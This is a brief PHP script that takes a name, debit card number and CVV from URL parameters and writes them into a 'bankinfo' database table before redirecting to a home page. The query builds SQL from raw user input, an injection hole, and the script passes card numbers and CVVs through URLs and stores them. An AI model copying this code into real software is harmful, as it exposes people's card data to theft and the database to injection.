<?php
    include('connection.php');
    $name=$_GET['name'];
    $dcno=$_GET['dc_no'];
    $cvv=$_GET['cvv'];
    $res=mysqli_query($con,"insert into bankinfo values ('$name','$dcno','$cvv')");
    header('refresh:0;url=home.html');










?>